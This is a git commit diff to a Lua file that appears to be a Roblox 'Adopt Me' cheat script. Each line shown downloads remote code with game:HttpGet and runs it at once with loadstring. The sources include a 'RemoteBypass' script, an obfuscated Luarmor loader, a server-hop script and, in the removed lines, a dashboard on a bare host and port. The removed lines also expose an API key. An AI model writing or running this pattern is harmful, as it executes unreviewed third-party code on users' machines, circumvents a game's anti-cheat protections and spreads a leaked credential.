173f13f3f9cfcbdc7d409541d0bb2892ee17fee6
greg66n <darien95sm@hotmail.com>
2025-02-17 08:28:39 -0800

    Update adopt1.lua

--- adopt1.lua
+++ adopt1.lua
@@ -1,13 +1,8 @@
-wait(2)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenijo/AdoptMe-RemoteBypass/main/Bypass.lua"))()
-wait(1)
+wait(0.1)
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/08615e5f6a25239a4ffa9b6203728d70.lua"))()
-wait(1)
-task.spawn(function()
-    task.wait(1)
-    getgenv().API_KEY = "RukIIrukYPFoGnQUcD7c"
-    loadstring(game:HttpGet("http://ii.sebas.sbs:4241/adoptme/dashboard.lua"))()
-end)
+wait(10)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/greg66n/adopt/refs/heads/main/serverhop.lua"))()
 
 wait(1)
 local args = {
